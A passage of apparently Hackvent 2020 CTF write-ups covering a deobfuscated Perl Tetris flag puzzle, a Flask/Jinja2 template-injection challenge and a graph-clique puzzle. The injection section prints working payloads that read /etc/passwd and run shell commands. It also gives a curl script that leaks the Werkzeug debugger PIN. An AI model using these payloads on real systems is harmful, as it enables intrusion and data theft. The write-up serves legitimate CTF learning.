        foreach $yy (0 .. 2) {
            foreach $xx (0 .. 5) {
                print "\e[${bcc}m\e[" . ($yy + $y + 2) . ';' . ($xx + $x * 2 + 2) . "H$bc" if ($b & 7 << $yy * 3) >> $yy * 3 & 4 >> ($xx >> 1);
            }
        }
    }
    sub r {
        $_ = shift();
        ($_ & 4) << 6 | ($_ & 32) << 2 | ($_ & 256) >> 2 | ($_ & 2) << 4 | $_ & 16 | ($_ & 128) >> 4 | ($_ & 1) << 2 | ($_ & 8) >> 2 | ($_ & 64) >> 6;
    }
    sub _s {
        ($b, $bc, $x, $y) = @_;
        foreach $yy (0 .. 2) {
            foreach $xx (0 .. 5) {
                substr($f[$yy + $y], $xx + $x, 1) = $bc if ($b & 7 << $yy * 3) >> $yy * 3 & 4 >> $xx;
            }
        }
        $Q = 'QcXgWw9d4';
        @f = grep({/ /;} @f);
        unshift @f, ' ' x $w while @f < $h;
        p();
    }
    sub cb {
        $_Q = 'ljhc0hsA5';
        ($b, $x, $y) = @_;
        foreach $yy (0 .. 2) {
            foreach $xx (0 .. 2) {
                return 1 if ($b & 7 << $yy * 3) >> $yy * 3 & 4 >> $xx and $yy + $y >= $h || $xx + $x < 0 || $xx + $x >= $w || substr($f[$yy + $y], $xx + $x, 1) ne ' ';
            }
        }
    }
    sub p {
        foreach $yy (0 .. $#f) {
            print "\e[" . ($yy + 2) . ";2H\e[0m";
            $_ = $f[$yy];
            s/./$&$&/g;
            print $_;
        }
    }
    sub k {
        $k = '';
        $k .= $c while $c = ReadKey(-1);
        $k;
    }
    sub n {
        $bx = 5;
        $by = 0;
        $bi = int rand scalar @BB;
        $__ = $BB[$bi];
        $_b = $FF[$sc];
        $sc == 98 and $_b =~ s/./0/ unless $sc > 77 and $sc < 98 and $sc != 82 and eval '$_b' . "=~y#$Q#$_Q#";
        $sc++;
    }
    @f = (' ' x $w) x $h;
    p ;
    n ;
    while (1) {
        $k = k();
        last if $k =~ /q/;
        $k = substr($k, 2, 1);
        $dx = ($k eq 'C') - ($k eq 'D');
        $bx += $dx unless cb $__, $bx + $dx, $by;
        if ($k eq 'A') {
            cb(r($__), $bx, $by) ? do {
                not cb(r($__), $bx + 1, $by)
            } ? do {
                $__ = r($__);
                ++$bx
            } : do {
                not cb(r($__), $bx - 1, $by)
            } && do {
                $__ = r($__);
                --$bx
            } : do {
                $__ = r($__)
            };
        }
        bl $__, $_b, 101 + $bi, $bx, $by;
        select undef, undef, undef, 0.1;
        if (cb $__, $bx, ++$by) {
            last if $by < 2;
            _s $__, $_b, $bx, $by - 1;
            n ;
        }
        else {
            bl $__, ' ', 0, $bx, $by - 1;
        }
    }
    sleep 1;
    ReadMode(0);
    print "\ec";
    

#### Analysis

There’s a flag right at the top of the clean code:

    
    
    @FF = split(//, '####H#V#2#0#{#h#t#t#p#s#:#/#/#w#w#w#.#y#o#u#t#u#b#e#.#c#o#m#/#w#a#t#c#h#?#v#=#d#Q#w#4#w#9#W#g#X#c#Q#}####', 0);
    

Python can remove the `#`s:

    
    
    >>> ff = '####H#V#2#0#{#h#t#t#p#s#:#/#/#w#w#w#.#y#o#u#t#u#b#e#.#c#o#m#/#w#a#t#c#h#?#v#=#d#Q#w#4#w#9#W#g#X#c#Q#}####'
    >>> ff.replace('#', '')
    'HV20{https://www.youtube.com/watch?v=dQw4w9WgXcQ}'
    

This is just a troll. The link is to a
[RickRoll](https://en.wikipedia.org/wiki/Rickrolling).

The code has three parts:

  1. Initialization stuff
  2. Define functions
  3. Loop

Looking at the loop first, it:

  * checks for user input
  * processes that to do rotations or move left or right
  * sleeps for 0.1 second
  * if the block is touching something else: 
    * if it’s touching something else and at the top, exit
    * else start a new block
  * else move the block down one and loop

I’ve added some comments in here:

    
    
    n ;
    while (1) {
        $k = k();                    # check for user input
        last if $k =~ /q/;           # if user inputs a 'q', quit
        $k = substr($k, 2, 1);
    ...[snip]...                     # move the block based on input
        select undef, undef, undef, 0.1;   # sleep 0.1 https://stackoverflow.com/questions/24747561/select-undef-undef-undef-xx
        if (cb $__, $bx, ++$by) {          # check if block is touching something
            last if $by < 2;               # if it's in the top 2, exit
            _s $__, $_b, $bx, $by - 1;
            n ;                            # generate next block
        }
        else {
            bl $__, ' ', 0, $bx, $by - 1;
        }
    }
    

The `k` function is just reading user input and storing it in `$k`:

    
    
    # read user keys
    sub k {
        $k = '';
        $k .= $c while $c = ReadKey(-1);
        $k;
    }
    

The more interesting function is `n`:

    
    
    # generate block
    sub n {
        $bx = 5;   # initialize starting position
        $by = 0;
        $bi = int rand scalar @BB;   # get random shape from list
        $__ = $BB[$bi];
        $_b = $FF[$sc];              # get next character from list
        # modify characters
        $sc == 98 and $_b =~ s/./0/ unless $sc > 77 and $sc < 98 and $sc != 82 and eval '$_b' . "=~y#$Q#$_Q#";
        $sc++;     # pointer to next character
    }
    

This function generates pieces at the top of the game by picking a random int
from `$BB` (the block options), and then getting the next character using a
counter `$sc` and the `$FF` string which had the troll flag.

The interesting line is the one I commented as “modify characters”. There’s a
bunch of logic in there, but it breaks down to:

  * if `$sc == 98`, replace `.` with null
  * if `77 < $sc < 98 and $sc != 82` –> `eval '$_b' . "=~y#$Q#$_Q#"`

The eval statement simplifies to `$_b =~ y#$Q#$_Q#`.

In Perl, `=~` is the [Binding
Operator](https://perldoc.perl.org/perlop#Binding-Operators), which does a
pattern match. `y` is a special first character, as it specifies
transliteration. It takes a pattern `y[delim][x][delim][y][delim]`. Typically
the `[delim]` is `/`, but it can be any character (in this case `#`). So for
this string, it will take the character in `$_b`, check if it is in `$Q`, and
if so, replace it with the equivalent character from `$_Q`.

The code is taking the youtube link and changing out the characters at the
end.

#### Solve Quickly

The first way I solved was to modify the script to print these characters to a
file. I’ll open a filehandle at the top of the loop:

    
    
    @f = (' ' x $w) x $h;
    open(logfile, ">", 'log.txt');
    p ;
    n ;
    while (1) {
    

Now on each call to `n()`, it’ll write that character to the file, but only if
it’s not a `#`, and to close that file on the last character:

    
    
        $sc++;     # pointer to next character
        $_b =~ /#/ or print logfile $_b;
        $sc == 98 and close(logfile);
    }
    

I don’t want to have to win, so I’ll change the exit conditions. I could just
comment it out, but then it breaks the terminal, so I’ll tell it to exit when
the counter reaches the end:

    
    
            #last if $by < 2;               # if it's in the top 2, exit
            last if $sc > 100;
    

Finally, I’ll comment out the sleep (`select undef, ...`).

Now I run that, and a junked up board hangs on screen for a second, and then
it returns:

![image-20201208082441166](https://0xdfimages.gitlab.io/img/image-20201208082441166.png)

The flag is in `log.txt`:

    
    
    $ cat log.txt 
    HV20{https://www.youtube.com/watch?v=Alw5hs0chj}
    

**Flag:`HV20{https://www.youtube.com/watch?v=Alw5hs0chj}`**

#### Solve Cleanly

To make it nicer, I commented out all the print statements in the original
file, as well as the both sleeps. Then I just added one line in `n()` to print
the character:

    
    
        $sc == 98 and $_b =~ s/./0/ unless $sc > 77 and $sc < 98 and $sc != 82 and eval '$_b' . "=~y#$Q#$_Q#";
        print $_b unless $_b =~ /#/;   # print flag
        $sc++;     # pointer to next character
    }
    

And adjusted the exit condition as above:

    
    
            #last if $by < 2;               # if it's in the top 2, exit
            last if $sc > 100;
    

Now running it just prints the flag to the terminal:

    
    
    $ perl deparse-mod-print.pl 
    HV20{https://www.youtube.com/watch?v=Alw5hs0chj0}
    

I can alternatively just delete 90% of the script and leave this loop over
`n()`:

    
    
    @FF = split(//, '####H#V#2#0#{#h#t#t#p#s#:#/#/#w#w#w#.#y#o#u#t#u#b#e#.#c#o#m#/#w#a#t#c#h#?#v#=#d#Q#w#4#w#9#W#g#X#c#Q#}####', 0); # characters for blocks
    
    sub n {
        $_b = $FF[$sc];              # get next character from list
        $sc == 98 and $_b =~ s/./0/ unless $sc > 77 and $sc < 98 and $sc != 82 and eval '$_b' . "=~y#$Q#$_Q#";
        print $_b unless $_b =~ /#/;
        $sc++;     # pointer to next character
    }
    while ($sc < 101) {
            n ;                            # generate next block
    }
    print "\n";
    

#### Solve Manually

As I know how the substitution is done, I could also just use that information
with a Python terminal to print the flag:

    
    
    >>> ff = '####H#V#2#0#{#h#t#t#p#s#:#/#/#w#w#w#.#y#o#u#t#u#b#e#.#c#o#m#/#w#a#t#c#h#?#v#=#d#Q#w#4#w#9#W#g#X#c#Q#}####'
    >>> q = 'QcXgWw9d4'
    >>> _q = 'ljhc0hsA5'
    >>> ''.join([_q[q.index(c)] if (77 < i < 98 and i != 82 and c in q) else '0' if i == 98 else c for i,c in enumerate(ff)]).replace('#', '')
    'HV20{https://www.youtube.com/watch?v=Alw5hs0chj0}'
    

### Easter Eggs

One fun Easter Egg in this challenge - If I start with the original code and
zoom way out (set the font size really small), it makes a neat pattern:

![image-20201207213752772](https://0xdfimages.gitlab.io/img/image-20201207213752772.png)

The other is the [video](https://www.youtube.com/watch?v=Alw5hs0chj0') in the
correct flag. For anyone who played Tetris many years ago, this was pretty
funny.

## HV20.09

### Challenge

![hv20-ball09](https://0xdfimages.gitlab.io/img/hv20-ball09.png) | HV20.09 Santa's Gingerbread Factory  
---|---  
Categories: |  ![penetration testing](../img/hv-cat-penetration_testing.png)PENETRATION TESTING  
![web security](../img/hv-cat-web_security.png)WEB SECURITY  
Level: | medium  
Author: |  inik.   
  
> Besides the gingerbread men, there are other goodies there. Let’s see if you
> can get the goodie, which is stored in `/flag.txt`.

### Solution

On spinning up an instance, visiting the URL in Firefox gives the following
page:

![image-20201209092811595](https://0xdfimages.gitlab.io/img/image-20201209092811595.png)

The user can change the eyes using the radio buttons, and the name “hacker”
using the text field. The HTTP request on changing either looks like:

    
    
    POST / HTTP/1.1
    Host: d7192e27-a270-4fe6-a06a-a5b96d453580.idocker.vuln.land
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://d7192e27-a270-4fe6-a06a-a5b96d453580.idocker.vuln.land/
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 44
    Connection: close
    Upgrade-Insecure-Requests: 1
    
    eyes=*&name=Hacker&btnSubmit=Get+Gingerbread
    

The response looks like:

    
    
    HTTP/1.1 200 OK
    Content-Length: 2419
    Content-Type: text/html; charset=utf-8
    Date: Wed, 09 Dec 2020 14:29:59 GMT
    Server: Werkzeug/1.0.1 Python/2.7.16
    Connection: close
    
    <html>
    ...[snip]...
    

The server is running Python, taking the input and building an ASCII
gingerbread man.

Testing for a handful of command injections, submitting things like `$(id)`
and `; cat /flag.txt`, shows that the input seems to be properly escaped.

A common injection technique that Python webservers are commonly vulnerable to
is server-side template injection (SSTI). SSTI occurs when the attacker can
control a string that is later handled as a template, allowing them to put in
stuff that will be handled as Python providing execution. [This
article](https://medium.com/@nyomanpradipta120/ssti-in-flask-
jinja2-20b068fdaeee) is a good overview, but
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
is my go-to for testing for and attacking SSTI.

This chart shows how to check if SSTI is a vector here:

![SSTI cheatsheet workflow](https://0xdfimages.gitlab.io/img/serverside.png)

The first payload didn’t work:

![image-20201209095454468](https://0xdfimages.gitlab.io/img/image-20201209095454468.png)

But the next one did:

![image-20201209095526216](https://0xdfimages.gitlab.io/img/image-20201209095526216.png)

I’ll try submitting `{{7 * df}}`, and it crashes, and leaks information about
the server:

![image-20201209100013515](https://0xdfimages.gitlab.io/img/image-20201209100013515.png)

Not only does this show that this is running
[Jinja2](https://jinja.palletsprojects.com/en/2.11.x/), but the error that
shows exactly where the injection takes place:

    
    
    text = Environment(loader=BaseLoader()).from_string("Hello, mighty " + name).render()
    

The server is taking input, creating a string “Hello, mighty [input]” and then
calling `render()` on that, which then processes that as a template, meaning
that stuff inside `{{}}` will be run.

PayloadsAllTheThings has a couple
[payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
---read-remote-file) to read files from the server, and the top one of those
successfully grabs `/etc/passwd`:

[
![image-20201209101317809](https://0xdfimages.gitlab.io/img/image-20201209101317809.png)
](https://0xdfimages.gitlab.io/img/image-20201209101317809.png)

[_Click for full
image_](https://0xdfimages.gitlab.io/img/image-20201209101317809.png)

Modifying this payload will leak `/flag.txt` as well:

![image-20201209101429631](https://0xdfimages.gitlab.io/img/image-20201209101429631.png)

**Flag:`HV20{SST1_N0t_ONLY_H1Ts_UB3R!!!}`**

### Leak Debug Pin

In the error page, moving the mouse over the various blocks shows a little
console icon that can be clicked to get the debugger:

![image-20201209101658903](https://0xdfimages.gitlab.io/img/image-20201209101658903.png)

On doing so, it pops a prompt for a PIN:

![image-20201209101727572](https://0xdfimages.gitlab.io/img/image-20201209101727572.png)

I tried to use [this technique](https://www.daehee.com/werkzeug-console-pin-
exploit/) to generate the pin, but wasn’t able to make it match.

Engy shared their technique with me, and it’s pretty neat. To show how it
works, first a demo on a local vm. First, create a dummy Flask app that just
prints the debug pin and cookie:

    
    
    $ echo from flask import Flask\;import werkzeug.debug\;app = Flask\(__name__\)\;print\(werkzeug.debug.get_pin_and_cookie_name\(app\)\) >/tmp/test
    $ cat /tmp/test 
    from flask import Flask;import werkzeug.debug;app = Flask(__name__);print(werkzeug.debug.get_pin_and_cookie_name(app))
    

Running that now prints the pin:

    
    
    $ python /tmp/test
    ('285-643-759', '__wzda5c99d5a48f1bb8aab83')
    

Now to do that on the server, I’ll need some way to get execution. Earlier
when I used `{{
''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}` to read
files, it was getting a list of all the loaded classes in the application, and
`open` was the 40th object in that array. Sending just `{{
''.__class__.__mro__[2].__subclasses__() }}` will return the full list of
classes available, and there’s another interesting one:

![image-20201209151357289](https://0xdfimages.gitlab.io/img/image-20201209151357289.png)

It’s at index 258, and will provide execution.

I’ll use one command to write the dummy flask app, another run it, pipping the
output to a file, and a file read to get the results.

This short Bash script has four `curl` commands to write, execute, read, and
delete:

    
    
    #!/bin/bash
    
    URL=https://$1
    curl -s -X POST $URL -d "name={{[].__class__.__base__.__subclasses__()[258]([\"echo from flask import Flask\;import        werkzeug.debug\;app = Flask\(__name__\)\;print\(werkzeug.debug.get_pin_and_cookie_name\(app\)\) >/tmp/test\"], shell=True)}}" 2>&1 >/dev/null
    curl -s -X POST $URL -d "name={{[].__class__.__base__.__subclasses__()[258]([\"python /tmp/test > /tmp/test1 2>/tmp/       test2\"], shell=True)}}" 2>&1 >/dev/null
    sleep 0.2
    curl -s -X POST $URL -d "name={{[].__class__.__base__.__subclasses__()[40](\"/tmp/test1\").read()}}" | grep Hello | sed -e 's/( Hello, mighty (&#39;\(.*\)&#39;, )/\1/'
    curl -s -X POST $URL -d "name={{[].__class__.__base__.__subclasses__()[258]([\"rm /tmp/test*\"], shell=True)}}" 2>&1 >/dev/null
    

It runs and returns the PIN:

    
    
    $ ./engy.sh fb95b7a9-3e53-47d8-99e6-3b1e290101b6.idocker.vuln.land
    656-420-258
    

Now on visiting
`https://fb95b7a9-3e53-47d8-99e6-3b1e290101b6.idocker.vuln.land/console`, I
can unlock it and access the Python debugger:

![image-20201209152047222](https://0xdfimages.gitlab.io/img/image-20201209152047222.png)

## HV20.10

### Challenge

![hv20-ball10](https://0xdfimages.gitlab.io/img/hv20-ball10.png) | HV20.10 Be patient with the adjacent  
---|---  
Categories: |  ![programming](../img/hv-cat-programming.png)PROGRAMMING   
Level: | medium  
Author: |  [bread](https://twitter.com/nonsxd)  
  
> Ever wondered how Santa delivers presents, and knows which groups of friends
> should be provided with the best gifts? It should be as great or as large as
> possible! Well, here is one way.
>
> Hmm, I cannot seem to read the file either, maybe the internet knows?
>
>
> [Download](https://drive.google.com/u/1/uc?id=11MlwFWS7H4pH9PdwOCiymNwR_QPLRwzM&export=download)

Over time, four hints were added:

>   * Hope this cliques for you
>   * Segfaults can be fixed - maybe read the source
>   * There is more than one thing you can do with this type of file! Try
> other options…
>   * Groups, not group
>

### Solution

#### Orient

Having never heard of this file type, I took to Google. `.col.b` is the binary
format of [DIMACS standard
format](http://lcs.ios.ac.cn/~caisw/Resource/about_DIMACS_graph_format.txt), a
format for sharing undirected graphs. A graph is just a series of nodes and
edges that connect them.There’s an ASCII version of this format, stored in
`.col` files. Looking at the top of the file, there’s some metadata and a
comment:

    
    
    284
    c -------------------------------- 
    c Reminder for Santa:
    c   104 118 55 51 123 110 111 116 95 84 72 69 126 70 76 65 71 33 61 40 124 115 48 60 62 83 79 42 82 121 125 45 98 114 101 97 100 are the nicest kids.
    c   - bread.
    c -------------------------------- 
    p edges 18876 439050
    ...[snip binary stuff]...
    

The list of numbers look like ASCII, but they just create a troll flag:

    
    
    >>> ''.join(map(chr,map(int, "104 118 55 51 123 110 111 116 95 84 72 69 126 70 76 65 71 33 61 40 124 115 48 60 62 83 79 42 82 121 125 45 98 114 101 97 100".split(' '))))
    'hv73{not_THE~FLAG!=(|s0<>SO*Ry}-bread'
    

#### Convert to ASCII

To make the file more readable, I’ll convert to the ASCII format. [This
page](https://mat.tepper.cmu.edu/COLOR/instances.html) has a translator
application. It’s in `.shar` format, and getting it to work is a bit of a sub-
challenge on its own. [shar files](https://en.wikipedia.org/wiki/Shar) are
shell archives, and are actually executable. Running it dumps its contents:

    
    
    $ ls
    binformat.shar
    $ ./binformat.shar 
    $ ls
    asc2bin.c  asc2bin.c.BAK  bin2asc.c  binformat.shar  genbin.h  generator.c  Makefile  README.binformat  showpreamble.c
    

Now I can use `make` to build the binaries I need, but it will fail. In
`genbin.h`, it defines these maxes:

    
    
    #ifndef GENBIN 
    #define GENBIN
    
    #include <stdio.h>
    
    /* If you change MAX_NR_VERTICES, change MAX_NR_VERTICESdiv8 to be 
    the 1/8th of it */
    
    #define MAX_NR_VERTICES         5000
    #define MAX_NR_VERTICESdiv8     625
    ...[snip]...
    

In the header of the file shown above, it shows there are 18876 vertices
(nodes), way more than 5000. So building as is will cause attempts to convert
the hackvent file to fail. I’ll change that to 20000, and then change
`MAX_NR_VERTICEdiv8` to 2500 per the comment.

Running `make` causes all kinds of warnings, but it also creates three
binaries, `asc2bin`, `bin2asc`, and `showpreamble`.

Running `./bin2asc 7b24b79f-d898-4480-bc1b-e09742f704f7.col.b` will generate
`7b24b79f-d898-4480-bc1b-e09742f704f7.col`. This file has just lines showing
edges, where `e 30 18` is an edge from node 30 to node 18:

    
    
    $ head -15 7b24b79f-d898-4480-bc1b-e09742f704f7.col
    c -------------------------------- 
    c Reminder for Santa:
    c   104 118 55 51 123 110 111 116 95 84 72 69 126 70 76 65 71 33 61 40 124 115 48 60 62 83 79 42 82 121 125 45 98 114 101 97 100 are the nicest kids.
    c   - bread.
    c -------------------------------- 
    p edges 18876 439050
    e 30 18
    e 42 24
    e 42 29
    e 48 7
    e 48 25
    e 50 33
    e 51 44
    e 52 23
    e 55 17
    

#### networkx

I need a way to play with the data, and the
[networkx](https://networkx.org/documentation/stable/index.html) package
allows me to do it in Python. Looking through the tutorials, I’m able to get
all the data read into a `Graph` object:

    
    
    #!/usr/bin/env python3
    
    import networkx as nx
    import sys
    
    with open(sys.argv[1], 'r') as f:
        lines = f.readlines()
    
    nicekids = list(map(int, lines[2].split(' ')[3:-4]))
    
    G = nx.Graph()
    for line in lines:
        if not line.startswith('e '): continue
        x, y = list(map(int, line.split(' ')[1:3]))
        G.add_edge(x,y)
    

This takes a minute, but running `python3 -i solve.py` will drop me into a
Python shell where I can start to look at the data more closely.

#### Analysis

The `find_cliques` function will get all the cliques, as the hints suggest. A
[clique](https://en.wikipedia.org/wiki/Clique_\(graph_theory\)) in graph
theory is a set of nodes where each node in the clique connects to all the
other nodes in the clique. Two nodes with a single edge form a clique, but
that is the boring base case.

This graph has 8524 cliques:

    
    
    >>> cliques = list(nx.find_cliques(G))
    >>> len(cliques)
    8524
    

That’s too many to be useful. But there is also this list of “the nicest
kids”. What about cliques that include a nice kid? This list comprehension
will show how many that is:

    
    
    >>> len([c for c in cliques if any([k in c for k in nicekids])])
    8397
    

That’s 8397 cliques that contain at least one kid. Still way to many.

What about cliques that contain all kids? None:

    
    
    >>> len([c for c in cliques if all([k in c for k in nicekids])])
    0
    

How many nicest kids are in each clique? This list comprehension will return a
list of the number of nice kids in each clique:

    
    
    >>> [sum([k in c for k in nicekids]) for c in cliques]
    [1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 